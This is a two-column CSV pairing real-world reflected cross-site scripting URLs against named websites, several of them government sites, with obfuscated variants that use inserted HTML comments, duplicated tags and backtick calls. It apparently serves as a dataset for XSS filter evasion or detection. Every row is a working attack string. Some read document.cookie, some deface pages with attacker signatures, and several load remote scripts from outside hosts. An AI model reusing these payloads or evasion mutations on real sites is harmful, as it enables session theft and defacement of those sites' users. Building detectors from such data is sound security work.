Payloads,Original
http://www.jamesdr.dyndns.org/gallery/login.asp?folder=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;ma<br>rquee<!--Comment-->&gt;&lt;<!--Comment-->ma<br>rquee&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,http://www.jamesdr.dyndns.org/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://www.montbeliard-zoom.fr/index.php?rech-site=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`'xss by<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>atm0n3r'`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,http://www.montbeliard-zoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher
http://www.fife.gov.uk/topics/index.cfm?fuseaction=straydogs.list&amp;subjectid=a6dea850-1d42-47be-9e75f<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>1d7b465ac63&amp;subjectid=a6dea850-1d42-47be-9e75f1d7b465ac63&amp;breed=&amp;coat=&amp;colour=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealer<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>t%28document.cookie%29%3b%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e&amp;location=&amp;finddogs=go,http://www.fife.gov.uk/topics/index.cfm?fuseaction=straydogs.list&amp;subjectid=a6dea850-1d42-47be-9e75f<br>1d7b465ac63&amp;subjectid=a6dea850-1d42-47be-9e75f1d7b465ac63&amp;breed=&amp;coat=&amp;colour=%22%3e%3cscript%3ealer<br>t%28document.cookie%29%3b%3c%2fscript%3e&amp;location=&amp;finddogs=go
http://www.dursunlarmetal.com.tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`&quot;backdoor&quot;`&lt;<!--Comment-->/scrip<br>t&gt;&lt;<!--Comment-->/scrip<br>t&gt;&lt;/scrip<br<!--Comment-->>t&gt;&lt;/scrip<br<!--Comment-->>t&gt;,http://www.dursunlarmetal.com.tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/scrip<br>t&gt;
http://www.osmgp.gov.ar/symposium2011/index.php?content=%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28document.co<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>okie%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.osmgp.gov.ar/symposium2011/index.php?content=%3c/script%3e%3cscript%3ealert%28document.co<br>okie%29%3c/script%3e
http://www.newprov.org/police/%27%22%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`1337`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%27%22%3e%3c<!--Comment-->m<br>arquee%3e%3cm<br>arquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e,http://www.newprov.org/police/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cm<br>arquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e
http://www.kebumen.go.id/doc.php?doc=%22%3e'%3e%3c<!--Comment-->script%20src=http://vuln.xssed.net/thirdparty/scri<br>pts/python5.js%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/scri<br<!--Comment-->>pts/python5.js%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,http://www.kebumen.go.id/doc.php?doc=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/scri<br>pts/python5.js%3e%3c/script%3e
http://www.math.u-bordeaux1.fr/ed/ecole_doctorale/index.php?n=main.wikisandbox?from=%22/&gt;&lt;<!--Comment-->body<br>onload=alert`1`&gt;&lt;<!--Comment-->body<br>onload=alert`1`&gt;&lt;body<br<!--Comment-->>onload=alert`1`&gt;&lt;body<br<!--Comment-->>onload=alert`1`&gt;,http://www.math.u-bordeaux1.fr/ed/ecole_doctorale/index.php?n=main.wikisandbox?from=%22/&gt;&lt;body<br>onload=alert(1)&gt;
http://iaeste.ut.ac.ir/login/login_server.asp?msghandler=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27xss%27%29;%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e%3c/script<br><!--Comment-->%3e,http://iaeste.ut.ac.ir/login/login_server.asp?msghandler=%3cscript%3ealert%28%27xss%27%29;%3c/script<br>%3e
http://ms120.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22maxwel%22`%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e,http://ms120.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e
http://www.csfd.cz/search_pg.php?search=%27%22%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3erubberduck%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c<!--Comment-->br%3e%3cbr<!--Comment-->%3e%3cbr<!--Comment-->%3e%3c<!--Comment-->br%3e%3c<!--Comment-->mar<br>quee%3e%3cmar<br<!--Comment-->>quee%3ewhitehat+forever%3c<!--Comment-->%2fmarque%3e%3c<!--Comment-->%2fmarque%3e,http://www.csfd.cz/search_pg.php?search=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmar<br>quee%3ewhitehat+forever%3c%2fmarque%3e
http://blog.games.com/search/?q=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`1`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://blog.games.com/search/?q=%3cscript%3ealert(1)%3c/script%3e
http://cgi.tbs.co.jp/bbs/bbsreception?contentsid=kameda-boxing&amp;bbsid=keijiban&amp;carrierid=web&amp;cmd=comm<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>it&amp;handle=%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%22%3e%27%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%6<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>6%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>39%29%29%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%0a,http://cgi.tbs.co.jp/bbs/bbsreception?contentsid=kameda-boxing&amp;bbsid=keijiban&amp;carrierid=web&amp;cmd=comm<br>it&amp;handle=%3c/script%3e%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%6<br>6%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35<br>%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%<br>39%29%29%3c%2f%73%63%72%69%70%74%3e%0a
http://www.mi2g.com/cgi-bin/htsearch?sort=score&amp;method=or&amp;config=htdig%2fwww_mi2g_com&amp;words=&lt;<!--Comment-->/title&gt;&lt;/title<!--Comment-->&gt;<br<!--Comment-->><br<!--Comment-->>&lt;body<!--Comment-->&gt;&lt;body<!--Comment-->&gt;&lt;script <!--Comment-->src=http://ha.ckers.org/s.js&gt;&lt;script src=http://ha.ckers.org/s.js<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;noscript<!--Comment-->&gt;&lt;noscript<!--Comment-->&gt;,http://www.mi2g.com/cgi-bin/htsearch?sort=score&amp;method=or&amp;config=htdig%2fwww_mi2g_com&amp;words=&lt;/title&gt;<br>&lt;body&gt;&lt;script src=http://ha.ckers.org/s.js&gt;&lt;/script&gt;&lt;noscript&gt;
http://www.institut-de-france.fr/rubrique_-la_guerre_de_cent_ans_1337_1453.html?arbo=150&amp;page=703%27<br<!--Comment-->><br<!--Comment-->>%22%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`1337`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.institut-de-france.fr/rubrique_-la_guerre_de_cent_ans_1337_1453.html?arbo=150&amp;page=703%27<br>%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e
http://www.gsmoffice.com/forum/redirector.php?url=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`2`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.gsmoffice.com/forum/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e
http://www.ua2go.com/flifo/flightdetail.do?airline=ua&amp;fltnbr=100&amp;orig=lax&amp;dest=dfw&amp;date=20091115&amp;sta<br<!--Comment-->><br<!--Comment-->>mp=test'&gt;&lt;/a<!--Comment-->&gt;&lt;<!--Comment-->/a&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`1`;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;,http://www.ua2go.com/flifo/flightdetail.do?airline=ua&amp;fltnbr=100&amp;orig=lax&amp;dest=dfw&amp;date=20091115&amp;sta<br>mp=test'&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
http://policy.mofcom.gov.cn/en/search!simplequery.html?section=&amp;querystring=%27%22%3e%3c%2ftitle<!--Comment-->%3e%3c%2ftitle<!--Comment-->%3e%<br<!--Comment-->><br<!--Comment-->>3cscript%3ealert`1337`%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3exss+by+xylitol%3c%2fh1<!--Comment-->%3e%3c%2fh1<!--Comment-->%3e%3c%2fmarquee%<br<!--Comment-->><br<!--Comment-->>3e&amp;search=search,http://policy.mofcom.gov.cn/en/search!simplequery.html?section=&amp;querystring=%27%22%3e%3c%2ftitle%3e%<br>3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%<br>3e&amp;search=search
http://www.jagranshop.com/shop/faces/tiles/search.jsp?q=%22%3e%3ciframe%20src=%22http://xssed.com%22<br<!--Comment-->>%3e%3ciframe%20src=%22http://xssed.com%22<br<!--Comment-->>%3e%3ciframe%20src=%22http://xssed.com%22<br<!--Comment-->>%3e%3ciframe%20src=%22http://xssed.com%22<br<!--Comment-->>%3e&amp;categoryid=&amp;catalogueid=90&amp;sid=&amp;bid=&amp;prc=,http://www.jagranshop.com/shop/faces/tiles/search.jsp?q=%22%3e%3ciframe%20src=%22http://xssed.com%22<br>%3e&amp;categoryid=&amp;catalogueid=90&amp;sid=&amp;bid=&amp;prc=
http://www.bbcamerica.com/tvschedule.jsp?keywordsearch=%5c%22%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%280%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>&amp;keywordsearchprint=%5c%22%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%280%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;showlistprint=&amp;scheduleformat=&amp;for<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>mat=list&amp;range=fullday&amp;timezone=est&amp;showslist=&amp;keyword=%5c%22%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%280%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>&amp;otherdates=,http://www.bbcamerica.com/tvschedule.jsp?keywordsearch=%5c%22%3cscript%3ealert%280%29%3c%2fscript%3e<br>&amp;keywordsearchprint=%5c%22%3cscript%3ealert%280%29%3c%2fscript%3e&amp;showlistprint=&amp;scheduleformat=&amp;for<br>mat=list&amp;range=fullday&amp;timezone=est&amp;showslist=&amp;keyword=%5c%22%3cscript%3ealert%280%29%3c%2fscript%3e<br>&amp;otherdates=
http://www.ditikimakedonia.gov.gr/print_kep.asp?id=12&amp;category=34&amp;kepid=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.coo<br<!--Comment-->><br<!--Comment-->>kie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,http://www.ditikimakedonia.gov.gr/print_kep.asp?id=12&amp;category=34&amp;kepid=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
